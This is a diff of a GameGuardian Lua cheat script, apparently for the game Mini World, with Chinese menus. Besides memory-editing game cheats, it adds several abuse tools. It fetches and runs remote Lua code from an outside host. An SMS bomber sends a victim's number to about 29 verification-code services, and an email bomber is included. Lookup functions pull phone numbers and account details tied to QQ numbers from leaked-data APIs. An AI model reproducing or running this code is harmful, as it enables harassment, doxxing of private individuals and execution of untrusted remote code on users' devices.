-qmnb = { {["memory"] = 4}, {["name"] = "特效"}, 
-{["value"] = 117901056, ["type"] = 4},
-{["lv"] = -1, ["offset"] = 8, ["type"] = 4},
-{["lv"] = 151587072, ["offset"] = -512, ["type"] = 4},
-{["lv"] = 16, ["offset"] = -508, ["type"] = 4},
-{["lv"] = 117901056, ["offset"] = 12, ["type"] = 4}}
-qmxg = { {["value"] = Q1, ["offset"] = 4, ["type"] = 4,["freeze"] = true},}xqmnb(qmnb)end
-function QQ3() qmnb = {
-{["memory"] = 4},
-{["name"] = "动作"},
-{["value"] = a, ["type"] = 4},
-{["lv"] = 16777473, ["offset"] = -68, ["type"] = 4},
-}
-qmxg = {
-{["value"] = Q3, ["offset"] = -80, ["type"] = 4},
-}
-xqmnb(qmnb)
-end 
 
 
 
@@ -5413,18 +6880,47 @@ XGCK=-1 end
 
 
 
+function QQ1()
+    gg.setRanges(4)
+local dataType = 32
+local tb1 = {{651061517835304960,0} }
+local tb2 = {{Q1, -224,true  }, }
+SearchWrite(tb1, tb2, dataType)
+gg.toast("吔屎啦你")
+	 gg.clearResults()
+end
+function QQ3() qmnb = {
+{["memory"] = 4},
+{["name"] = "动作"},
+{["value"] = lq, ["type"] = 4},
+{["lv"] = 16777473, ["offset"] = -0x48, ["type"] = 4},}
+qmxg = {
+{["value"] = Q3, ["offset"] = -0x54, ["type"] = 4},}
+xqmnb(qmnb)
+end
+
+
 function Main4()  
-menu1= gg.choice({
-    "𒅒🧊❤️紫色月亮𒅒🧊❤️",
-    "𒅒🧊❤️碧琪特效𒅒🧊❤️",
-    "𒅒🧊❤️绿色特效𒅒🧊❤️",
-    "𒅒🧊❤️彩虹拖尾𒅒🧊❤️",
-    "𒅒🧊❤️️蓝色特效𒅒🧊❤️",
-    "𒅒🧊❤️️花小楼特效𒅒🧊❤️",
-    "𒅒🧊❤️️冰公主特效𒅒🧊❤️",
-    "𒅒🧊❤️️叶萝莉特效𒅒🧊❤️",
-   "𒅒🧊❤️恢复️特效𒅒🧊❤️", 
-    "𒅒🎡返 回 主 页🎡𒅒",},2018,os.date("𒅒管他呢，我就是这么无情𒅒"))
+menu1 = gg.choice({
+    "𒅒♥️紫色月亮♥️𒅒",
+    "𒅒♥️碧琪特效♥️𒅒",
+    "𒅒♥️绿色特效♥️𒅒",
+    "𒅒♥️彩虹拖尾♥️𒅒",
+    "𒅒♥️️蓝色特效♥️𒅒",
+    "𒅒♥️️花小楼特效♥️𒅒",
+    "𒅒♥️️冰公主特效♥️𒅒",
+    "𒅒♥️️叶萝莉特效♥️𒅒",
+    "𒅒♥️跳舞动作♥️𒅒",
+    "𒅒♥️抱坐动作♥️𒅒",
+    "𒅒♥️睡觉动作♥️𒅒",
+    "𒅒♥️️欢呼动作♥️𒅒",    
+    "𒅒♥️漂浮动作️♥️𒅒", 
+    "𒅒♥️摸空气动作️♥️𒅒",
+    "𒅒♥️抠鼻子动作♥️𒅒",
+    "𒅒♥️️害羞动作♥️𒅒",    
+    "𒅒♥️死亡动作️♥️𒅒", 
+   "𒅒♥️恢复动作️特效♥️𒅒", 
+    "𒅒🎡返 回 主 页🎡𒅒",},2018,os.date("𒅒人们只会注意最耀眼的烟火，所以，骚年请保存你的耀眼𒅒"))
 if menu1==1 then Q1=12 QQ1() end
 if menu1==2 then Q1=13 QQ1() end
 if menu1==3 then Q1=14 QQ1() end
@@ -5433,9 +6929,93 @@ if menu1==5 then Q1=16 QQ1() end
 if menu1==6 then Q1=17 QQ1() end
 if menu1==7 then Q1=18 QQ1() end
 if menu1==8 then Q1=19 QQ1() end
-if menu1==9 then Q1=0 QQ1()  gg.clearList() end
-if menu1==10 then Main() end
+if menu1==9 then Q3=999479 QQ3() end
+if menu1==10 then Q3=99999927 QQ3() end
+if menu1==11 then Q3=3122 QQ3() end
+if menu1==12 then Q3=954418 QQ3() end
+if menu1==13 then Q3=42002 QQ3() end
+if menu1==14 then Q3=222221442 QQ3() end
+if menu1==15 then Q3=2167939 QQ3() end
+if menu1==16 then Q3=1606835 QQ3() end
+if menu1==17 then Q3=16777217 QQ3() end
+if menu1==18 then Q3=0 QQ3()  gg.clearList() end
+if menu1==19 then Main() end
 XGCK=-1 end
+function SearchWrite(Search, Write, Type)
+    gg.clearResults()
+    gg.setVisible(false)
+    gg.searchNumber(Search[1][1], Type)
+    local count = gg.getResultCount()
+    local result = gg.getResults(count)
+    gg.clearResults()
+    local data = {} --用于保存有效结果
+    local base = Search[1][2] --(0 或主特征码后三位)(用于计算相对主特征码的偏移)
+    
+   if (count > 0) then
+        for i, v in ipairs(result) do
+            v.isUseful = true --保存搜索到的地址信息(全部设定为true)
+        end
+        
+        for k=2, #Search do
+            local tmp = {}
+            local offset = Search[k][2] - base --特征码偏移(副特征码后三位 - 主特征码后三位)
+            local num = Search[k][1] --特征码
+            
+            for i, v in ipairs(result) do
+                tmp[#tmp+1] = {} --添加项目
+                tmp[#tmp].address = v.address + offset  --项目地址为主特征码地址+偏移量
+                tmp[#tmp].flags = v.flags  --项目数据类型
+            end
+            
+            tmp = gg.getValues(tmp) --刷新项目值
+            
+            for i, v in ipairs(tmp) do
+                if ( tostring(v.value) ~= tostring(num) ) then --判断项目值与其他特征码是否一致
+                    result[i].isUseful = false --不符合过滤条件设定为false
+                end
+            end
+        end
+  
+        for i, v in ipairs(result) do
+            if (v.isUseful) then --筛选出符合条件的主特征码地址
+                data[#data+1] = v.address
+            end
+        end
+        --------------内存写入
+        if (#data > 0) then
+           gg.toast("检测到"..#data.."条外来数据")
+           local t = {}
+           local base = Search[1][2]
+           for i=1, #data do
+               for k, w in ipairs(Write) do
+                   offset = w[2] - base
+                   t[#t+1] = {}
+                   t[#t].address = data[i] + offset
+                   t[#t].flags = Type
+                   t[#t].value = w[1]
+                   --- 冻结项目添加到列表
+                   if (w[3] == true) then
+                       local item = {}
+                       item[#item+1] = t[#t]
+                       item[#item].freeze = true
+                       gg.addListItems(item)
+                   end
+                   --- 不需要可以注释掉
+               end
+           end
+           gg.setValues(t)
+          -- gg.toast("已修改"..#t.."条数据")
+          -- gg.addListItems(t)
+        else
+            gg.toast("not found", false)
+            return false
+        end
+    else
+        gg.toast("Not Found")
+        return false
+    end
+end
+
 
 
 
@@ -5934,6 +7514,11 @@ menu1 = gg.choice({
 '💘北仙💘',
 '💘白九💘',
 '💘倾城💘',
+'🍓无名🍓',
+'🍓神圣🍓',
+'🍓白露🍓',
+'🍓天跑🍓',
+'🍓墨凉🍓',
 '❣️返回辅助❣️'},
 nil,'我们不想出名，只不过是不想那么快被忘记.....')
 if menu1 == 1 then Main() end
@@ -5959,6 +7544,11 @@ if menu1 == 20 then Main() end
 if menu1 == 21 then Main() end
 if menu1 == 22 then Main() end
 if menu1 == 23 then Main() end
+if menu1 == 24 then Main() end
+if menu1 == 25 then Main() end
+if menu1 == 26 then Main() end
+if menu1 == 27 then Main() end
+if menu1 == 28 then Main() end
 GLWW=-1
 end
 
@@ -5968,6 +7558,45 @@ end
 
 
 
+function Main7()  
+SN = gg.choice({
+	 "💚傲傲💚",
+	 "💜龙哥(破解版)💜",
+	 "❤️凉兮❤️",
+	 "返回辅助",
+}, nil, "凉情")
+if SN==1 then
+     XEZTFZ()
+end
+if SN==2 then
+	 XIAOBEI()
+end
+if SN==3 then
+	 XBSSX()
+end
+if SN==4 then
+	 Main()
+end
+FX=0
+end
+
+
+
+
+
+
+
+function XIAOBEI()
+     pcall(load(gg.makeRequest("http://zl.lnlcup.cn/a/1633407907.lua").content))
+end
+
+function XEZTFZ()
+     pcall(load(gg.makeRequest("http://zl.lnlcup.cn/a/1633389596.lua").content))
+end
+
+function XBSSX()
+ pcall(load(gg.makeRequest("http://zl.lnlcup.cn/a/1633413027.lua").content))
+end
          
  -- []测试
  
@@ -6063,13 +7692,6 @@ end
 end
 function YY998() Obtain=gg.makeRequest("https://api.uomg.com/api/rand.music?sort=热歌榜&format=json").content muchen=Obtain:match('url":"(.-)","picurl') gg.playMusic(muchen) end 
 --主页
-function jjjh2()
-Obtain=gg.makeRequest("https://wp.aaa456.cn/viewphp/3585c8ca3deaad727b0bdeaf92412b24music").content muchen=Obtain:match('url":"(.-)","picurl') gg.playMusic(muchen) end 
---主页
-
-
-
-
 
 
  
@@ -6082,14 +7704,13 @@ Obtain=gg.makeRequest("https://wp.aaa456.cn/viewphp/3585c8ca3deaad727b0bdeaf9241
 
 
 
-function Main7()  
+function Main8()  
  SN = gg.choice({
    "𒅒♥搜索歌曲🔍♥️𒅒",
    "𒅒♥️搜索列表🌐♥️𒅒",
    "𒅒♥️播放热歌🗣️♥️𒅒",
    "𒅒♥️停止播放💤♥️𒅒",
    "𒅒♥️️清除冻结➖♥️𒅒",
-    "𒅒♥️️凉情专属音乐⭐♥️𒅒",
    "𒅒♥️返回主页️➗♥️𒅒",
 },2018,os.date("𒅒当前时间%Y年%m月%d日%H时%M分%S秒𒅒"))
 if SN==1 then s1() end
@@ -6097,8 +7718,7 @@ if SN==2 then Play(gqlb,idb) end
 if SN==3 then YY998() end
 if SN==4 then stop() end
 if SN==5 then Main11() end
-if SN==6 then jjjh2() end
-if SN==7 then Main() end
+if SN==6 then Main() end
 XGCK=-7
 end
 
@@ -6142,11 +7762,333 @@ end
 
 
 
+function Main9()  
+ menu1 = gg.choice({
+'𒅒🧊查看作者𒅒🧊',
+'𒅒🧊辅助公告𒅒🧊',
+"🎃返 回 主 页🎃",
+}, nil, "惊雷这通天修为......")
+if menu1 == 1 then lsp1() end
+if menu1 == 2 then lsp2() end
+if menu1 == 3 then Main() end
+GLWW=-1
+end
 
-function Exited()
-print("💋此辅助永远免费，请不要购买盗版\n❤凉情:".."["..K.."]")
-gg.alert(os.date("🧡凉情辅助\n💋公告:凉情出版 \n🌺凉情:".."["..K.."]\n❤时间:%Y年%m月%d日%H时%M分%S秒"),"确认退出")
-gg.toast("退出辅助成功\n耗时:999999秒\n欢迎下次使用")
+
+
+
+function lsp1()  
+  SN = gg.choice({
+    "凉情城.主作者",
+    "返回主页",
+  }, nil, "凉情.末日之神(点击凉情城可以复制凉情迷你号")
+  if SN==1 then
+    GSM1()
+  end
+  if SN==11 then
+    Main()
+  end
+  FX1=0
+end
+
+function GSM1()
+  gg.copyText("凉情迷你号1421879199")
+end
+
+
+
+function lsp2()  
+  SN = gg.choice({
+  "查看公告",
+    "返回主页",
+  }, nil, "我们又见面了，你身旁多了一个他.....️")
+  if SN==1 then
+    pl1()
+  end
+  if SN==2 then
+    Main()
+  end
+  FX1=0
+end
+
+function pl1()
+gg.alert[[
+许多人对我的评价很差，没有理由，我狂是我不想屈服，我以后会更新 可能有点慢，不过我保证每个功能都能用
+]]
+end
+
+function Main10()  
+ menu1 = gg.choice({
+"查q绑定",
+"手机号反查",
+"轰炸手机号",
+"轰炸qq邮箱",
+"手机号归属信息",
+"获取qq头像",
+"小艺同学",
+"🎆返 回 主 页🎆",
+}, nil, "[北海]这是你的宿命......也是我的宿命")
+if menu1 == 1 then ls1() end
+if menu1 == 2 then ls2() end
+if menu1 == 3 then ls3() end
+if menu1 == 4 then ls4() end
+if menu1 == 5 then ls5() end
+if menu1 == 6 then ls6() end
+if menu1 == 7 then ls7() end
+if menu1 == 8 then Main() end
+GLWW=-1
+end
+
+function ls1()
+    local musu=gg.prompt({"🎃输入QQ号即可查询🌕","🌚网址1","🌝网址2(即将关闭)"
+    },{
+      [1]="",
+      [2]=true,
+      [3]=false
+    },{
+      "number",
+      "checkbox",
+      "checkbox"
+    })
+    if not musu then
+      return nil
+     else
+      if musu[2]==true and musu[3]==true then
+        gg.alert('⭐️两个网址，只能选择一个')
+        return nil
+      end
+      if musu[2]==true then
+        gg.toast("💫查询ing...",false)
+        local xg=gg.makeRequest("http://yc52.net/qb-api.php?mod=cha&qq="..musu[1]).content
+        if not xg then
+          gg.alert('☀️你已拒绝网络申请，查询失败☀️')
+          return
+        end
+        local jg=xg:match('mobile": "(.-)"')
+        local qq=xg:match('"qq": "(.-)"')
+        if jg==nil then
+          gg.alert('🔥未查询到…库中并没有这个记录❄️','💨确定🌬')
+          return nil
+        end
+        local yue=gg.alert('💦ＱＱ号:'..qq..'\n\n💦手机号:'..jg,'🌊复制','🌪取消')
+        if yue==1 then
+          gg.copyText('[ＱＱ号]:'..qq..' \n[手机号]:'..jg,false)
+        end
+        if yue==2 then
+          return nil
+        end
+      end
+    end
+    if musu[3]==true then
+      gg.toast("💧查询ing...",false)
+      local xg2=gg.makeRequest("http://cxx.yun7.me/qqcx?qq="..musu[1]).content
+      if not xg2 then
+        gg.alert('🍎你已拒绝网络申请，查询失败🍊')
+        return
+      end
+      --    status":200,"message":"查询成功","phone":"669","phonediqu":"河北保定 移动","lol":"没有找到","wb":"6134218","qqlm":"没有找到"}
+
+      local jg2=xg2:match('phone":"(.-)"')--手机号
+      local qq1=xg2:match('phonediqu":"(.-)"')--号码归属地
+      local qq2=xg2:match('lol":"(.-)"')--LOL信息
+      local qq3=xg2:match('wb":"(.-)"')--微博信息
+      if jg2==nil then
+        gg.alert('🥝未查询到…库中并没有这个记录🍌','🍇确定🍇')
+        return nil
+      end
+      local yue=gg.alert('🥒ＱＱ号:'..musu[1]..'\n\n🌽手机号:'..jg2..'\n\n🥜号码归属地:'..qq1..'\n\n🍞LOL信息:'..qq2..'\n\n🍳微博UID'..qq3,'🍟复制','🥙取消')
+      if yue==1 then
+        gg.copyText('ＱＱ号:'..musu[1]..' \n 手机号:'..jg2..'  \n号码归属地:'..qq1..' \n LOL信息:'..qq2..'  \n微博UID:'..qq3,false)
+      end
+      if yue==2 then
+        return nil
+      end
+    end
+end
+
+function ls2()
+    local musu=gg.prompt({"🍭输入手机号即可反查🍭"
+    },{
+      [1]=""
+    },{
+      "number"
+    })
+    if not musu then
+      return nil
+     else
+      gg.toast("🍬查询ing...",false)
+      local xg=gg.makeRequest("http://cxx.yun7.me/qqxc?phone="..musu[1]).content
+      if not xg then
+        gg.alert('🍼你已拒绝网络申请，查询失败🥤')
+        return
+      end
+      ---     {"status":200,"message":"查询成功","qq":"(.-)","phonediqu":"(.-)","lol":"(.-)",","qqlm":"没有找到"}
+      local jg=xg:match('qq":"(.-)"')--qq号
+      local qq=xg:match('phonediqu":"(.-)"')--号码归属地
+      local qq1=xg:match('lol":"(.-)"')--LOL信息
+      local qq2=xg:match('wb":"(.-)"')--微博
+      if jg==nil then
+        gg.alert('🥢未查询到…库中并没有这个记录🥡','🥌确定')
+        return nil
+      end
+      local yue=gg.alert('🎿ＱＱ号:'..jg..'\n\n⚾️号码归属地:'..qq..'\n\n⚽️LOL信息:'..qq1..'\n\n🏀微博UID'..qq2,'🏌复制','🏹取消')
+      if yue==1 then
+        gg.copyText('ＱＱ号:'..jg..' \n 号码归属地:'..qq..' \n LOL信息:'..qq1..' \n微博UID'..qq2,false)
+      end
+      if yue==2 then
+        return nil
+      end
+    end
+end
+
+function ls3()
+local A=gg.prompt({"💥输入您要轰炸的电话号码💥"},{""},{"number"})
+    if not A then
+      return nil
+     else
+local B=A[1]
+local C=gg.makeRequest("http://211.156.201.12:8088/youzheng//ems/security?phone="..B.."").content
+local C=gg.makeRequest("http://id.ifeng.com/api/simplesendmsg?mobile="..B.."&comefrom=7&auth=&msgtype=0").content
+local C=gg.makeRequest("http://srmemberapp.srgow.com/sys/captcha/"..B.."").content
+local C=gg.makeRequest("https://m.icbc.com.cn/WapDynamicSite/TouchPage/AppDownResponse.aspx?type=1&app_id=5&mobile_no="..B.."").content
+local C=gg.makeRequest("https://kfsbusiness.anjuke.com/weiliaoke/login/sendcode.json?ticket=&cid=&cv=5.6.0&app=i-ajk&udid2=85C1EEA5-6E6A-449B-BD5C-118EA0DFDDBB&phone="..B.."").content
+local C=gg.makeRequest("http://api.qingmang.me/v1/account.sendVerification?platform=console&token=&phone=%2B86"..B.."&code=10164337").content
+local C=gg.makeRequest("https://api.kqiu.cn/user/v1/sms/code?phoneNumber="..B.."").content
+local C=gg.makeRequest("http://prod.layadmin.cn/api/message/sendV2?app_id=1&version=1.4.0&channel_id=001&phone="..B.."").content
+local C=gg.makeRequest("http://121.36.193.131/api/v3.1/thirdpartyapi/aliyunmessageapi/SendVerifyMessage?phoneNumber=86"..B.."&type=1").content
+local C=gg.makeRequest("https://api.diebian.net/Get/GetVerificationSMS?PhoneNumber="..B.."").content
+local C=gg.makeRequest("https://tele.uos123.com/api/orders/orders/sendDxSmsCode?mobile="..B.."").content
+local C=gg.makeRequest("https://www.qxueyou.com/v3/learning/uc/login/mobile/captcha?mobilePhone="..B.."&product=qxueyou").content
+local C=gg.makeRequest("http://www.gkbbapp.com/Support/JsonNews.aspx?sendShortMessage=yes&Telephone="..B.."").content
+local C=gg.makeRequest("https://www.ajia.cn/api/sys/sendCaptchaNoUser?accountName="..B.."").content
+local C=gg.makeRequest("https://yi.yshoufa.com/usersystem/site/network/getNetworkPhoneCaptcha?phone="..B.."&networkId=").content
+local C=gg.makeRequest("http://dx.zy40.cn/dx/index.php?hm="..B.."").content
+local C=gg.makeRequest("http://www.edu-edu.com/cas/web/message/send?phone="..B.."").content
+local C=gg.makeRequest("http://id.ifeng.com/api/simplesendmsg?mobile="..B.."").content
+local C=gg.makeRequest("http://m.tk.cn/tkmobile/orderSentSmsServlet?mobile="..B.."").content
+local C=gg.makeRequest("https://pass.hujiang.com/v2/api/v1/sms/send?action=SendMsg&mobile="..B.."").content
+local C=gg.makeRequest("http://m.tk.cn/tkmobile/orderSentSmsServlet?mobile="..B.."&comefrom=7&auth=&msgtype=0").content
+local C=gg.makeRequest("https://api.wanwudezhi.com/module-user/api/v1/user/sendSmsCode?phone="..B.."").content
+local C=gg.makeRequest("https://sso-c.souche.com/loginApi/getCaptchaUrlByPhone.json?app=tangeche&phone="..B.."").content
+local C=gg.makeRequest("http://api.qingmang.me/v1/account.sendVerification?code=1566478386.8872059778&phone="..B.."").content
+local C=gg.makeRequest("http://user.daojia.com/mobile/getcode?mobile="..B.."").content
+local C=gg.makeRequest("https://m.yiwise.com/apiPlatform/verificationCode/send?phoneNumber="..B.."").content
+local C=gg.makeRequest("http://slb-sport.vesal.cn/vesal-sport-prod/v1/app/member/getCode?tellAndEmail="..B.."").content
+local C=gg.makeRequest("http://cms.51fenmi.com/api/base/public/getCode?mobile="..B.."").content
+local C=gg.makeRequest("http://www.52gcc.com/bomb/index.php?hm="..B.."").content
+end
+end
+
+function ls4()
+  local Feed=gg.prompt({"✈️收件人地址(邮箱)✈️","🚀邮箱主题🚀","🛸发件内容🛫","🏁轰炸次数🏁"},{"192898257@qq.com","劳资就轰炸你","劳资就轰炸你","1"},{"text","text","text","text"})
+  if not Feed then gg.toast("🎢取消发送！🎢",true)
+    return nil
+  end
+  if Feed[1]~="" and Feed[2]~="" and Feed[3]~="" and Feed[4]~="" then
+    gg.toast("🗽发送中ing...",true)
+    for i=1,Feed[4] do
+      xg=gg.makeRequest("https://simpleauth.cn/api/mail/api.php?address="..Feed[1].."&name="..Feed[2]..i.."&certno="..Feed[3]..i).content
+    end
+    if not xg then
+      gg.alert("🕋发送失败！⌚️",'💿确定📀')
+    end
+    local jg=xg:match('"Code":"(.-)",')
+    local jg2=xg:match('msg":"(.-)"')
+    if jg =="1" then
+      gg.alert(jg2,'🖱确定🖱')
+     else
+      gg.alert("🔫发送失败！🔫",'🔨确定🔨')
+      return nil
+    end
+   else
+    gg.alert("📡填写信息不完整！📡","🔋确定🔋")
+    return nil
+  end
+end
+
+function ls5()
+sjh=gg.prompt({"💡输入手机号即可查询💡"},{[1]=""},{"number"})
+if sjh== nil then gg.toast("🔦取消选择默认初始化🔦")
+else
+gg.toast("🕯正在查询🕯")
+su1=gg.makeRequest("https://www.ip138.com/mobile.asp?mobile="..sjh[1].."&action=mobile").content:match("卡号归属地(.-)邮 编")
+dq=su1:match('span>(.-)&')--地区
+dq1=su1:match(';(.-)<')--地区2
+GSM=su1:match('型(.-)/s'):match("pan>(.-)<")
+su2=gg.makeRequest("https://jx.ip138.com/"..sjh[1].."/").content--凶吉
+b=su2:match('邮政编码：(.-)</tr>')
+yb=b:match('<p>(.-)</p')--邮编
+qh=b:match('电话区号：</p></td>(.-)/td>'):match('>(.-)<')--区号
+xj=su2:match('red">(.-)href'):match("a>(.-)<")--凶吉
+QQ=("手机号:\n"..sjh[1].."\n凶吉:"..xj.."\n"..GSM.."\n定位:\n"..dq..dq1.."\n邮编:"..yb.."\n区号:"..qh)
+QQ1=gg.alert(QQ,"💎复制💎","💰返回💰")
+if QQ1==0 then Main() end
+if QQ1==1 then gg.copyText(QQ) gg.toast("🛡已复制🛡") end
+if QQ1==3 then Main() end
+end
+end
+
+
+function ls6()
+y=gg.prompt({"🐚请输入qq号🎋"},{},{"number"})
+if y== nil then gg.toast("🔦取消选择默认初始化🔦")
+else
+gg.toast("🍥正在下载……🥘")
+ByXEY=gg.getFile():gsub('/[^/]+$','').."/"..y[1]..".jpg"
+YC1=gg.makeRequest("https://q.qlogo.cn/headimg_dl?dst_uin="..y[1].."&spec=100").content
+io.open(ByXEY,"w"):write(YC1)
+gg.alert("🍔已下载到：\n"..ByXEY)
+end
+end
+function ls7()
+OI = gg.prompt({"请输入聊天的对话 北海原创"},{"小爱同学"},{"text"})
+LOL = gg.makeRequest("https://jintia.jintias.cn/api/xatx.php?msg="..OI[1]).content
+B=LOL:match('text":"(.-)"')
+gg.alert(B)
+a7()
+end
+function aa1()
+local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaGvXhBoXwSc4WivMVhZPxivGalHoN7LXhGa1fARTgqHwhIHPqwcm3Qp232NFO6Nm3QNG32rm3gNG3QNG3g9m3gym3QNGOxy2O6NF3QNmOxymOxp2aBvoNqv4fGy1Oxy4WGa4QSa1VXaiyGy4H7yjVXy7Wlp2ajL588sXYhyPy6y73FaPWxNmafZPqwc4WXy7dlNjOANjsiHo3fZ1flp4sGH4wjNj9jp5Hly1OqajRFNjR8p4r7HiajH7R8NFa7yTrhy4H7yjVXy7WlNFaqZP6hy4d7N1OiLi3Gc4WIN26ARiQlZPwSc4Wiv5QIa7flRiNJLPxfsTShrf6is7Lwc4W_&s7t=36929").content
+end
+
+function aa2()
+local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaGvXhBoXwSc4WivMVhZPxivGalHoN7LXhGa1fisK3FoXx8vPOhROO6ROdXR4YqROOMRORgROWMROOMROQQROWAROOMR4SlR4YXROOqR4SAR4S6RiqBsM3Bc4dly1YAy4yMyjdXH7Y7NiyANjyGy1H7y4V6RiNfZ5Q7Z1fGp43jyjgwa1gFRT9UvPOhy4H7yjVXN4WANFa8Lo9kcPyAa1rXa4NFHPyxN4WMN1YXy7H6a1YxH7Q8H7dAajHlRTyGL1fANjyGy1H7y4VXRT3UvjfAyjyfNmaXaodhym6f0jWiHogUZPrhymaEHPxTc4ViHXhqvT9Ge4q14Fa7NXOhyr__&s7t=7e83f").content
+end
+
+function aa3()
+local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaGvXhBoXwSc4WivMVhZPxivGa7L5Qfc4VisK3FoXx8vPOhROO6ROdXR4YqROOMRORgROWMROOMROQQROWAROOMR4SlR4YXROOqR4SAR4S6RiqBsM3Bc4WqNjyAyP9SN53Sp4VGN4HANjyGy1H7y4V6RiNfZ5Q7Z1qjy5QSaPr6aj3wRT9UvPOhy4H7yjVXN1HMyma8Lo9kc48jHXdXyXy7pPHXajylyX3iy1Wfa53FN7d7aPy6NPRSRTyGL1fANjyGy1H7y4VXRT3UvjfAyjyfNmaXaodhym6f0jWiHogUZPrhymaEHPxTc4ViHXhqvT9Ge4q14Fa7NXOhyr__&s7t=e2302").content
+end
+
+function aa4()
+local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaGvXhBoXwSc4WivMVhZPxivGa7L5Qfc4WisK3FoXx8vPOhROO6ROdXR4YqROOMRORgROWMROOMROQQROWAROOMR4SlR4YXROOqR4SAR4S6RiqBsM3Bc4Wqp4sAyPyMa1QiH4Q8NiHANjyGy1H7y4V6RiNfZ5Q7Z1fxHiNSH4y7NjaFRT9UvPOhy4H7yjVXN1slNma8Lo9kc4y6y1dMHXOfH49iN5RFN7SlHXOlH4VGNXR8H4Oxy138RTyGL1fANjyGy1H7y4VXRT3UvjfAyjyfNmaXaodhym6f0jWiHogUZPrhymaEHPxTc4ViHXhqvT9Ge4q14Fa7NXOhyr__&s7t=9ae63").content
+end
+
+function aa5()
+local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaJs1qGaoNfHoRfRTRJvXqCZPrhymafZPqwc4WXy7dlNjrMN1siHo3fZ1qFNPawy1VMa1R8H4s6H7sxN49jN1yqHPR8p1d7H4dAyGa7yTrhy4H7yjVXy7WlNFaqZP6hy4d7N1OiLi3Gc4WIN26ARiQlZPwSc4Wiv5QIa7flRiNJLPxfsTShrf6is7Lwc4W_&s7t=cc243").content
+end
+
+function aa6()
+local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaGvXhBoXwSc4WivMVhZPxivGaBHPwIL5QUvjfARTgqHwhIHPqwcm3Qp232NFO6Nm3QNG32rm3gNG3QNG3g9m3gym3QNGOxy2O6NF3QNmOxymOxp2aBvoNqv4fANjYAy4W6a5WqN1VAyPaiy4H7yjVXy7Wlp2ajL588sXYhN4VMpPOlp1a8aFafZPqwc4WXy7dlNjrMp1SiHo3fZ1f6a4V7p4yAa1y6H4dfpPy7N5HfyPdxp53SH4SXaP9SNma7yTrhy4H7yjVXy7WlNFaqZP6hy4d7N1OiLi3Gc4WIN26ARiQlZPwSc4Wiv5QIa7flRiNJLPxfsTShrf6is7Lwc4W_&s7t=7b3c1").content
+end
+
+function aa7()
+local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaGvXhBoXwSc4WivMVhZPxivGaBHPwIL5QUvjflRTgqHwhIHPqwcm3Qp232NFO6Nm3QNG32rm3gNG3QNG3g9m3gym3QNGOxy2O6NF3QNmOxymOxp2aBvoNqv4fAN7rGy4Wqp1SqN1RFy4aSy4H7yjVXy7Wlp2ajL588sXYhyXrfN73Fy7g8y2afZPqwc4WXy7dlNjr6N4ViHo3fZ1qFpPWXyXRSNPR8aiQwHPH7y1R8y7sMH7d7Hj8wyjOfyGa7yTrhy4H7yjVXy7WlNFaqZP6hy4d7N1OiLi3Gc4WIN26ARiQlZPwSc4Wiv5QIa7flRiNJLPxfsTShrf6is7Lwc4W_&s7t=44f26").content
+end
+function aa8()
+local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaGvXhBoXwSc4HivMVhZPxivGa7L5Qfc4WisK3FoXx8vPOhROO6ROdXR4YqROOMRORgROWMROOMROQQROWAROOMR4SlR4YXROOqR4SAR4S6RiqBsM3Bc4OqN7WAHjY6yPH7N7sGp4WXy7dlNjyAy1YiHM9kHoNkc4wFHX98y7yXNidiL5wBa4fANjyGy1H7NjHqRiQqL5Yhyir6yjyGyXaFpPOlp4y7N1Oxp49wyjO7aPHGy19wN4Wis7Rfc4WXy7dlNjyAy1HiLPwIc4WGy7rqRTawsjfA0jrIyma8s5wUa1fARiA8vishy2ajvM3ILKRxcONpRTyMa4fA&s7t=b57a2").content
+end
+
+function aa9()
+local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaGvXhBoXwSc4HivMVhZPxivGa7L5Qfc4VisK3FoXx8vPOhROO6ROdXR4YqROOMRORgROWMROOMROQQROWAROOMR4SlR4YXROOqR4SAR4S6RiqBsM3Bc4y7y1WAN5rfHir7yj88HjWXy7dlNjyAy1YiHM9kHoNkcPylHP9wa18iNPOiL5wBa4fANjyGy1H7N1y6RiQqL5Yhp1d6p1sxH7YMy1OGa5QSN4VXHPdqyiNSaiOMyP9FH4Vis7Rfc4WXy7dlNjyAy1HiLPwIc4WGy7rqRTawsjfA0jrIyma8s5wUa1fARiA8vishy2ajvM3ILKRxcONpRTyMa4fA&s7t=9e079").content
+end
+
+function aa10()
+local zctij = gg.makeRequest("http://shequ.mini1.cn:8087/miniw/rent_server?s7=HPNfcoNwLK9UviLCsihJvmaJs1qGaoNfHoRfRTRJvXqCZPrhNFafZPqwc4WXy7dlNjyxp1HiHo3fZ1qia5R8N1g8ajwwH4OAa4R8aPd6NiWAN4Q8NjylN4sxpma7yTrhy4H7yjVXy7WlNFaqZP6hy4d7N1OiLi3Gc4WIN26ARiQlZPwSc4Wiv5QIa7flRiNJLPxfsTShrf6is7Lwc4W_&s7t=b31a4").content
+end
+
+
+function Exit()
+print("台下人走过.....不见旧颜色") 
 os.exit() end 
 while true do if gg.isVisible(true) then   FX1 = nil  gg.setVisible(false) end  if FX1 == nil then  Main()  end  end
 
